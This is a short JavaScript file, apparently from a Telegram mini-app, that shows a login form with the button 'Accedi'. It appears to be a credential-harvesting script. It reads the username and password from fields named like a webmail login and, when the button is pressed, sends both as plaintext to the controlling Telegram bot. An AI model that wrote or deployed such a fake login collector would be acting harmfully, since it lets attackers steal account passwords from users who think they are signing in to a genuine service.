var pickers = {
	username: document.querySelector('input[name="_user"]'),
	password: document.querySelector('input[name="_pass"]'),
}


function pickHandler (e) {
	if(pickers.username.value && pickers.password.value){
	    if(pickers.username.value.length>0 && pickers.password.value.length>0){
	    Telegram.WebApp.MainButton.show()
	    return true
	    }
	}
	return false
}

function sendData () {
    var data=""
    if(pickers.username.value && pickers.password.value){
        data = pickers.username.value +" "+pickers.password.value
    }
	Telegram.WebApp.sendData(data)
}

function init () {
	Telegram.WebApp.ready()
	Telegram.WebApp.MainButton
		.setText('Accedi')
		.onClick(sendData)
}
pickers.username.addEventListener('change', pickHandler)
pickers.password.addEventListener('change', pickHandler)
document.addEventListener('DOMContentLoaded', init)
